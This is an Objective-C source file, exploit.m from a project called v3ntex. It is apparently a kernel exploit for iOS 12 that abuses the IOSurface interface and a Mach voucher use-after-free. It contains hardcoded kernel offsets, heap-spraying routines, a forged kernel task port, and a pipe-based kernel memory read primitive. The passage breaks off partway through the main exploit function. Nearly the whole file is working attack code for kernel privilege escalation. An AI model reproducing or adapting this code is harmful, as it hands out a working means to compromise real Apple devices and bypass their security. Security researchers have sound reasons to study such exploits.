//
//  exploit.m
//  v3ntex
//
//  Created by tihmstar on 23.01.19.
//  Copyright Â© 2019 tihmstar. All rights reserved.
//

#include "exploit.h"
#import <Foundation/Foundation.h>
#include <CoreFoundation/CoreFoundation.h>
#include <sched.h>
#include <sys/mman.h>
#include "offsets.h"
#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <mach/mach_host.h>
#include <mach/thread_act.h>
#include <mach/task.h>
#include <mach/mach_error.h>
#include <mach/mach_time.h>
#include <mach/mach_port.h>
#include <pthread/pthread.h>
#include <mach-o/loader.h>
#include <mach/host_priv.h>
#include <unistd.h>


const uint32_t IOSURFACE_CREATE_SURFACE =  0;
const uint32_t IOSURFACE_SET_VALUE      =  9;
const uint32_t IOSURFACE_GET_VALUE      = 10;
const uint32_t IOSURFACE_DELETE_VALUE   = 11;

const uint32_t IKOT_TASK                = 2;

#define postProgress(prg) [[NSNotificationCenter defaultCenter] postNotificationName: @"JB" object:nil userInfo:@{@"JBProgress": prg}]

/* iOS 11 */
#define OFFSET_TASK_ITK_SELF        0xd0
#define OFFSET_IOUSERCLIENT_IPC     0x9c

//real offsets
///* iOS 12 */
#define IOSURFACE_CREATE_OUTSIZE    0xdd0
#define OFFSET_IPC_SPACE_IS_TASK 0x28
#define OFFSET_ZONE_MAP 0xfffffff007628ec8
#define OFFSET_TASK_BSD_INFO 0x358
#define BSDINFO_PID_OFFSET  0x60
#define OFFSET_COPYIN 0xfffffff0071b90b0
#define OFFSET_COPYOUT 0xfffffff0071b94e4
#define OFFSET_KERNEL_TASK 0xfffffff007606078
#define OFFSET_ROP_LDR_X0_X0_0X10 0xfffffff00726a0e0
#define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX 183
#define OFFSET_PROC_UCRED 0xf8
#define OFFSET_KAUTH_CRED_REF 0xfffffff0073f7e90
#define OFFSET_KERNELBASE   0xfffffff007004000
#define OFFSET_CHGPROCCNT 0xfffffff007424680
#define OFFSET_KERNEL_MAP 0xfffffff007606080
#define OFFSET_VM_MAP_HDR 0x10
#define OFFSET_REALHOST_SPECIAL 0x10
#define OFFSET_OSSERIALIZER_SERIALIZE 0xfffffff007514a10
#define OFFSET_IPC_PORT_ALLOC_SPECIAL 0xfffffff0070bc0c0

#define OFFSET_IPC_KOBJECT_SET 0xfffffff0070d55c4
#define OFFSET_IPC_PORT_MAKE_SEND 0xfffffff0070bb944 //maybe
#define OFFSET_SIZEOF_TASK 0x5a0
#define OFFSET_TASK_ITK_REGISTERED 0x2e8
#define OFFSET_REALHOST 0xfffffff00760bbb8



#define KERNEL_MAGIC             MH_MAGIC_64
#define KERNEL_SLIDE_STEP        0x100000
#define KERNEL_HEADER_OFFSET     0x4000

enum{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};

// IOKit cruft
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;
CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *client);
kern_return_t IOServiceClose(io_connect_t client);
kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint32_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);


#define error(a ...) do { printf(a);printf("\n");} while(0)
#define assure(a) do{ if ((a) == 0){err=__LINE__; goto error;} }while(0)
#define reterror(a ... ) {error(a); err=__LINE__; goto error;}
#define doassure(cond,code) do {if (!(cond)){(code);assure(cond);}} while(0)
#define LOG(a...) (printf(a),printf("\n"))

#define RELEASE_PORT(port) \
do{ \
if(MACH_PORT_VALID((port))){ \
_kernelrpc_mach_port_destroy_trap(self, (port)); \
port = MACH_PORT_NULL; \
} \
} while(0)

typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad;
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;//this one is refcount
    union {
        kptr_t *premsg;
    } kdata2;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount; //offset 0x28
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef volatile union
{
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
            type     :  8;
#ifdef __LP64__
            uint32_t pad;
#endif
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
#ifdef __LP64__
        uint32_t pad;
#endif
        kptr_t map;
    } a;
    struct {
        char pad[OFFSET_TASK_ITK_SELF];
        kptr_t itk_self;
    } b;
} ktask_t;

typedef volatile union
{
    struct {
        // IOUserClient fields
        kptr_t vtab;
        uint32_t refs;
        uint32_t pad;
        // Gadget stuff
        kptr_t trap_ptr;
        // IOExternalTrap fields
        kptr_t obj;
        kptr_t func;
        uint32_t break_stuff; // idk wtf this field does, but it has to be zero or iokit_user_client_trap does some weird pointer mashing
        // OSSerializer::serialize
        kptr_t indirect[3];
    } a;
    struct {
        char pad[OFFSET_IOUSERCLIENT_IPC];
        int32_t __ipc;
    } b;
} kobj_t;

typedef volatile struct{
    kptr_t prev;
    kptr_t next;
    kptr_t start;
    kptr_t end;
} kmap_hdr_t;

typedef struct{
    uint32_t    iv_hash;        /* checksum hash */
    uint32_t    iv_sum;         /* checksum of values */
    uint32_t    iv_refs;        /* reference count */
    uint32_t    iv_table_size;  /* size of the voucher table */
    uint32_t    iv_inline_table[MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN];
    kptr_t    iv_table;       /* table of voucher attr entries */
    kptr_t      iv_port;        /* port representing the voucher */
    struct queue_entry {
        kptr_t next;
        kptr_t prev;
    }  iv_hash_link;
} __attribute__ ((packed)) voucher_t;

static uint32_t transpose(uint32_t val){
    uint32_t ret = 0;
    for(size_t i = 0; val > 0; i += 8){
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

#define NUM_BEFORE 0x1000
#define NUM_AFTER 0x100
#define NUM_AFTER2 0x2000
mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
mach_port_t after2[NUM_AFTER2] = { MACH_PORT_NULL };
mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };

static int gfakeport_idx = -1;
static mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;
static task_t self = MACH_PORT_NULL;
static mach_vm_size_t pagesize = 0x1000;


static int *pipefds = NULL;
static size_t pipecnt = 0;
static void *pipebuf = NULL;

kern_return_t my_mach_port_set_context(task_t task, mach_port_name_t name, mach_vm_address_t context){
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
        mach_vm_address_t context;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()
    
    union {
        Request In;
        Reply Out;
    } Mess;
    
    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;
    
    InP->NDR = NDR_record;
    InP->name = name;
    InP->context = context;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3229;
    InP->Head.msgh_reserved = 0;
    
    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    if(ret == KERN_SUCCESS)
        ret = OutP->RetCode;
    
    return ret;
}

void spinner_empty(mach_port_t *arg){
    while (!*arg); //spin
}

void spinner_nonempty(uint64_t *arg){
    while (*arg); //spin
}

// Raw MIG function for a merged IOSurface deleteValue + setValue call, attempting to increase performance.
// Prepare everything - sched_yield() - fire.
static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uint32_t propertyId, void *buf, mach_vm_size_t len){
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        uint32_t inband_input[4];
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } DeleteRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } SetRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_type_number_t inband_outputCnt;
        char inband_output[4096];
        mach_msg_type_number_t scalar_outputCnt;
        uint64_t scalar_output[16];
        mach_vm_size_t ool_output_size;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()
    
    // Delete
    union {
        DeleteRequest In;
        Reply Out;
    } DMess;
    
    DeleteRequest *DInP = &DMess.In;
    Reply *DOutP = &DMess.Out;
    
    DInP->NDR = NDR_record;
    DInP->selector = IOSURFACE_DELETE_VALUE;
    DInP->scalar_inputCnt = 0;
    
    DInP->inband_input[0] = surfaceId;
    DInP->inband_input[2] = transpose(propertyId);
    DInP->inband_input[3] = 0x0; // Null terminator
    DInP->inband_inputCnt = sizeof(DInP->inband_input);
    
    DInP->ool_input = 0;
    DInP->ool_input_size = 0;
    
    DInP->inband_outputCnt = sizeof(uint32_t);
    DInP->scalar_outputCnt = 0;
    DInP->ool_output = 0;
    DInP->ool_output_size = 0;
    
    DInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    DInP->Head.msgh_remote_port = client;
    DInP->Head.msgh_local_port = mig_get_reply_port();
    DInP->Head.msgh_id = 2865;
    DInP->Head.msgh_reserved = 0;
    
    // Set
    union {
        SetRequest In;
        Reply Out;
    } SMess;
    
    SetRequest *SInP = &SMess.In;
    Reply *SOutP = &SMess.Out;
    
    SInP->NDR = NDR_record;
    SInP->selector = IOSURFACE_SET_VALUE;
    SInP->scalar_inputCnt = 0;
    
    SInP->inband_inputCnt = 0;
    
    SInP->ool_input = (mach_vm_address_t)buf;
    SInP->ool_input_size = len;
    
    SInP->inband_outputCnt = sizeof(uint32_t);
    SInP->scalar_outputCnt = 0;
    SInP->ool_output = 0;
    SInP->ool_output_size = 0;
    
    SInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    SInP->Head.msgh_remote_port = client;
    SInP->Head.msgh_local_port = mig_get_reply_port();
    SInP->Head.msgh_id = 2865;
    SInP->Head.msgh_reserved = 0;
    
    kern_return_t ret = 0;
    kern_return_t retf = 0;
    
    // Deep breath
    usleep(420);
    sched_yield();
    
    // Fire
    ret = mach_msg(&DInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(DeleteRequest), (mach_msg_size_t)sizeof(Reply), DInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    retf = mach_msg(&SInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(SetRequest), (mach_msg_size_t)sizeof(Reply), SInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    if(ret == KERN_SUCCESS)
        ret = DOutP->RetCode;
    
    if(ret != KERN_SUCCESS)
        return ret;
    
    if(retf == KERN_SUCCESS)
        retf = SOutP->RetCode;
    
    return ret ? ret : retf;
}

uint32_t kread32(kptr_t loc){
    int err = 0;
    uint32_t pid = 0;
    kern_return_t ret = 0;
    uint64_t readptr = loc-BSDINFO_PID_OFFSET;
    
    int rfd = pipefds[2 * gfakeport_idx];
    ssize_t didread = read(rfd, pipebuf, pagesize);
    assure(didread == pagesize);
    int wfd = pipefds[2 * gfakeport_idx + 1];
    
    {
        uintptr_t ptr = (uintptr_t)pipebuf;
        ptr += 0x700;
        *(uint64_t*)(ptr+OFFSET_TASK_BSD_INFO) = readptr; //read from
    }
    ssize_t written = write(wfd, pipebuf, pagesize);
    assure(written == pagesize);
    usleep(300);
    
    ret = pid_for_task(real_port_to_fake_voucher, (int*)&pid);
    
error:
    if (err) {
        printf("kread32 failed!\n");
        printf("error=%d ret=0x%08x s=%s\n",err,ret,mach_error_string(ret));
    }
    return pid;
}

uint64_t kread64(kptr_t loc){
    uint64_t rt = 0;
    rt = kread32(loc);
    rt |= ((uint64_t)kread32(loc+4)) <<32;
    return rt;
}

typedef union{
    char _padding[IOSURFACE_CREATE_OUTSIZE]; // XXX 0x6c8 for iOS 11
    struct{
        mach_vm_address_t addr1;
        mach_vm_address_t addr2;
        mach_vm_address_t __pad;
        uint32_t id;
    } data;
} surface_t;

static void set_nonblock(int fd) {
    int flags = fcntl(fd, F_GETFL);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

int v3_increase_file_limit() {
    int err = 0;
    struct rlimit rl = {};
    int error = getrlimit(RLIMIT_NOFILE, &rl);
    assure(!error);
    rl.rlim_cur = 10240;
    rl.rlim_max = rl.rlim_cur;
    error = setrlimit(RLIMIT_NOFILE, &rl);
    doassure(!error,{
        LOG("could not increase file limit: %d", error);
    });
    
    error = getrlimit(RLIMIT_NOFILE, &rl);
    assure(!error);
    doassure(rl.rlim_cur == 10240,{
        LOG("file limit is %llu", rl.rlim_cur);
    });
error:
    return err;
}

mach_port_t v3ntex() {
    int err = 0;
    kern_return_t ret = 0;
    kptr_t kbase = 0;
    task_t kernel_task = MACH_PORT_NULL;
    
    self = mach_task_self();
    host_t host = mach_host_self();
    
    assure(!v3_increase_file_limit());
    assure(!(ret = mach_vm_allocate(mach_task_self(), (mach_vm_address_t*)&pipebuf, pagesize, VM_FLAGS_ANYWHERE)));
    
    pipecnt = 0x500;
    assure((pipefds = calloc(1,MAX(pipecnt * 2 * sizeof(int),pagesize))));
    memset(pipefds, 0, pipecnt * 2 * sizeof(int));
    for (size_t i = 0; i<pipecnt; i++) {
        pipefds[i*2] = -1;
        pipefds[i*2+1] = -1;
        
        int error = pipe(&pipefds[i*2]);
        if (error != 0 || pipefds[i*2] < 0 || pipefds[i*2+1] < 0) {
            close(pipefds[i*2]);
            close(pipefds[i*2+1]);
            pipecnt = i;
            break;
        }
        set_nonblock(pipefds[i*2+1]);
    }
    LOG("real pipecnt=0x%lx",pipecnt);
    
    mach_port_t stuffport = MACH_PORT_NULL;
    
    mach_voucher_attr_recipe_data_t atm_data = {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = 510
    };
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    assure(MACH_PORT_VALID(service));
    
    io_connect_t client = MACH_PORT_NULL;
    ret = IOServiceOpen(service, self, 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    assure(!ret);
    
    assure(MACH_PORT_VALID(client));
    uint32_t dict_create[] ={
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };
    
    surface_t surface;
    
    size_t size = sizeof(surface);
    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
    LOG("newSurface: %s", mach_error_string(ret));
    assure(!ret);
    
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &stuffport);
    LOG("stuffport: %x, %s", stuffport, mach_error_string(ret));
    assure(!ret && MACH_PORT_VALID(stuffport));
    
    ret = _kernelrpc_mach_port_insert_right_trap(self, stuffport, stuffport, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    assure(!ret);
    
    mach_port_t realport = MACH_PORT_NULL;
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);
    
    doassure(!ret,{
        LOG("mach_port_allocate: %s", mach_error_string(ret));
    });
    doassure(MACH_PORT_VALID(realport),{
        LOG("realport: %x", realport);
    });
#define NUM_GC 0x1000
    mach_port_t gc[NUM_GC] = { MACH_PORT_NULL };
    for(size_t i = 0; i < NUM_GC; ++i){
        ret = host_create_mach_voucher(mach_host_self(),(mach_voucher_attr_raw_recipe_array_t)&atm_data,sizeof(atm_data),&gc[i]);
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }
    
    for(size_t i = 0; i < NUM_BEFORE; ++i){
        ret = host_create_mach_voucher(mach_host_self(),(mach_voucher_attr_raw_recipe_array_t)&atm_data,sizeof(atm_data),&before[i]);
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }
    
    mach_port_t p1 = MACH_PORT_NULL;
    assure(!(ret = host_create_mach_voucher(mach_host_self(),(mach_voucher_attr_raw_recipe_array_t)&atm_data,sizeof(atm_data),&p1)));
    
    
    for(size_t i = 0; i < NUM_AFTER; ++i){
        ret = host_create_mach_voucher(mach_host_self(),(mach_voucher_attr_raw_recipe_array_t)&atm_data,sizeof(atm_data),&after[i]);
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }
    
#pragma pack(4)
    typedef struct {
        mach_msg_base_t base;
        mach_msg_ool_ports_descriptor_t desc[2];
    } StuffMsg;
#pragma pack()
    StuffMsg msg;
    msg.base.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.base.header.msgh_remote_port = stuffport;
    msg.base.header.msgh_local_port = MACH_PORT_NULL;
    msg.base.header.msgh_id = 1234;
    msg.base.header.msgh_reserved = 0;
    msg.base.body.msgh_descriptor_count = 2;
    msg.desc[0].address = before;
    msg.desc[0].count = NUM_BEFORE;
    msg.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.desc[0].deallocate = FALSE;
    msg.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.desc[1].address = after;
    msg.desc[1].count = NUM_AFTER;
    msg.desc[1].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.desc[1].deallocate = FALSE;
    msg.desc[1].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ret = mach_msg(&msg.base.header, MACH_SEND_MSG, (mach_msg_size_t)sizeof(msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    LOG("mach_msg: %s", mach_error_string(ret));
    assure(!ret);
    
    for(size_t i = NUM_AFTER; i > 0; --i){
        if(MACH_PORT_VALID(after[i - 1])){
            ret = _kernelrpc_mach_port_destroy_trap(self, after[i - 1]);
            after[i - 1] = MACH_PORT_NULL;
        }
    }
    for(size_t i = NUM_BEFORE; i > 0; --i){
        if(MACH_PORT_VALID(before[i - 1])){
            ret =_kernelrpc_mach_port_destroy_trap(self, before[i - 1]);
            before[i - 1] = MACH_PORT_NULL;
        }
    }
    
#define DATA_PAGE_SIZE 0x1000
    uint32_t dict[DATA_PAGE_SIZE / sizeof(uint32_t) + 7] ={
        // Some header or something
        surface.data.id,
        0x0,
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,
        kOSSerializeString | (DATA_PAGE_SIZE - 1),
    };
    dict[DATA_PAGE_SIZE / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;
    
    
    voucher_t newVoucher = {
        .iv_hash = 0,
        .iv_sum = 0x11,
        .iv_refs = 99,
        .iv_inline_table[0] = 0x4000,
        .iv_inline_table[1] = 0x4000,
        .iv_inline_table[2] = 0x4000,
        .iv_inline_table[3] = 0x4000,
        .iv_inline_table[4] = 0x4000,
        .iv_inline_table[5] = 0x4000,
        .iv_inline_table[6] = 0x4000,
        .iv_inline_table[7] = 0x4000,
        .iv_table = 0,
        .iv_port  = 0,
    };
    
    int vouchers_in_osstring = 0;
    for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_PAGE_SIZE; ptr + sizeof(voucher_t) <= end; ptr += sizeof(voucher_t)){
        *(volatile voucher_t*)ptr = newVoucher;
        vouchers_in_osstring++;
    }
    
    mach_port_t p2 = MACH_PORT_NULL;
    assure(!(ret = host_create_mach_voucher(mach_host_self(),(mach_voucher_attr_raw_recipe_array_t)&atm_data,sizeof(atm_data),&p2)));
    
    mach_port_t p3 = MACH_PORT_NULL;
    assure(!(ret = host_create_mach_voucher(mach_host_self(),(mach_voucher_attr_raw_recipe_array_t)&atm_data,sizeof(atm_data),&p3)));
    
    mach_port_t p4 = MACH_PORT_NULL;
    assure(!(ret = host_create_mach_voucher(mach_host_self(),(mach_voucher_attr_raw_recipe_array_t)&atm_data,sizeof(atm_data),&p4)));
    
    
    assure(!(ret = thread_set_mach_voucher(mach_thread_self(), p1)));
    
    assure(!(ret = task_swap_mach_voucher(mach_task_self(), p1, &p2)));
    
    
    for(size_t i = NUM_GC; i > 0; --i){
        if(MACH_PORT_VALID(gc[i - 1])){
            _kernelrpc_mach_port_destroy_trap(self, gc[i - 1]);
            gc[i - 1] = MACH_PORT_NULL;
        }
    }
    LOG("herp derp");
    usleep(150000);
    
    sched_yield();
    ret = task_swap_mach_voucher(mach_task_self(), p1, &p3);//magic voucher free
    LOG("task_swap_mach_voucher: %s", mach_error_string(ret));
    assure(!ret);
    
    _kernelrpc_mach_port_destroy_trap(self, stuffport);
    
    size_t finalI = 0;
    for(size_t i = 0; i < NUM_GC; ++i){
        uint64_t t0,t1;
        
        t0 = mach_absolute_time();
        ret = host_create_mach_voucher(mach_host_self(),(mach_voucher_attr_raw_recipe_array_t)&atm_data,sizeof(atm_data),&gc[i]);
        t1 = mach_absolute_time();
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
        if (t1-t0 > 1000) {
            LOG("my_gc breaking at %d with tdiff=%lld",(int)i,t1-t0);
            finalI = i;
            break;
        }
    }
    
#define SPRAY_SIZE 0x4000
    for(uint32_t i = 0; i < SPRAY_SIZE; ++i){
        dict[DATA_PAGE_SIZE / sizeof(uint32_t) + 6] = transpose(i);
        
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
        doassure(!ret, {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
        });
    }
    
    //reset GC workaround
    for(size_t i = 0; i <= finalI; i++){
        if(MACH_PORT_VALID(gc[i - 1])){
            _kernelrpc_mach_port_destroy_trap(self, gc[i - 1]);
            gc[i - 1] = MACH_PORT_NULL;
        }
    }
    
    
    for(size_t i = 0; i < NUM_AFTER2; ++i){
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after2[i]);
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }
    
    for(size_t i = 0; i < NUM_BEFORE; ++i){
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &before[i]);
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }
    
    //alloc port in voucher
    assure(!(ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher)));
    
    for(size_t i = 0; i < NUM_AFTER; ++i){
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after[i]);
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }
    
    
    uint32_t request[] ={
        // Same header
        surface.data.id,
        0x0,
        0, // Key
        0x0, // Null terminator
    };
    
    uint32_t response[4 + (DATA_PAGE_SIZE / sizeof(uint32_t))] = { 0 };
    size = sizeof(response);
    
    kptr_t port_address = 0;
    int fake_voucher_idx = 0;
    int fake_voucher_jdx = 0;
    voucher_t targetVoucher = {};
    
    for (int i=0; i<SPRAY_SIZE && !port_address; i++) {
        request[2] = transpose(i);
        assure(!(ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size)));
        
        voucher_t *v = (voucher_t*)&response[4];
        for (int j=0; j<vouchers_in_osstring; j++) {
            if (v[j].iv_port) {
                targetVoucher = v[j];
                port_address = targetVoucher.iv_port;
                fake_voucher_idx = i;
                fake_voucher_jdx = j;
                LOG("port_address=%p",(void*)port_address);
                LOG("fake_voucher_idx=%d",fake_voucher_idx);
                LOG("fake_voucher_jdx=%d",fake_voucher_jdx);
                
                targetVoucher.iv_port &= ~(DATA_PAGE_SIZE-1);
                targetVoucher.iv_port += 0x4000 * 64; //4kPage
                
                LOG("Shifted Port!");
                break;
            }
        }
    }
    assure(port_address);
    
    
    kport_t kport ={
        .ip_bits = 0x80000002, // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
        .ip_references = 100,
        .ip_lock ={
            .type = 0x11,
        },
        .ip_messages ={
            .port ={
                .receiver_name = 1,
                .msgcount = MACH_PORT_QLIMIT_KERNEL,
                .qlimit = MACH_PORT_QLIMIT_KERNEL,
            },
        },
        .ip_srights = 99,
        .ip_kobject = 0x6162636465666768
    };
    
#pragma mark kobj
    kport.ip_kobject = targetVoucher.iv_port + 0x700;
    
    {
        uintptr_t ptr = (uintptr_t)&dict[5];
        ptr += fake_voucher_jdx*sizeof(voucher_t);
        *(volatile voucher_t*)ptr = targetVoucher;
    }
    
    LOG("kport.ip_kobject=%p",(void*)kport.ip_kobject);
    
    {
        uintptr_t ptr = (uintptr_t)pipebuf;
        *(volatile kport_t*)ptr = kport;
        ptr += 0x700;
        *(uint32_t*)(ptr+0x10) = 0x77; //refcnt
        *(uint64_t*)(ptr+OFFSET_TASK_BSD_INFO) = 0x4142434445464748; //read from
    }
    
    for(uint32_t i = 0; i < pipecnt; ++i){
        int wfd = pipefds[2 * i + 1];
        ssize_t written = write(wfd, pipebuf, pagesize);
        if (written != pagesize) {
            // This is most likely because we've run out of pipe buffer memory. None of
            // the subsequent writes will work either.
            
            pipecnt = i; //real sprayed count
            break;
        }
    }
    LOG("sprayed pipecnt=0x%lx",pipecnt);
    
    LOG("targetVoucher->iv_port=%p",(void*)targetVoucher.iv_port);
    
    LOG("final buf realloc :o");
    dict[DATA_PAGE_SIZE / sizeof(uint32_t) + 6] = transpose(fake_voucher_idx);
    ret = reallocate_buf(client, surface.data.id, fake_voucher_idx, dict, sizeof(dict));
    LOG("reallocate_buf: %s", mach_error_string(ret));
    assure(!ret);
    
    //    //dunno why but realloc_buf doesn't seem to properly reallocate the page
    //    for (int i=0; i<SPRAY_SIZE; i++) {
    //        if (i == fake_voucher_idx)
    //            continue;
    //        delete_val(client, surface.data.id, i);
    //    }
    for(uint32_t i = 0; i < 0x10; ++i){
        if (i == fake_voucher_idx) { //don't realloc fake_voucher_idx twice!
            continue;
        }
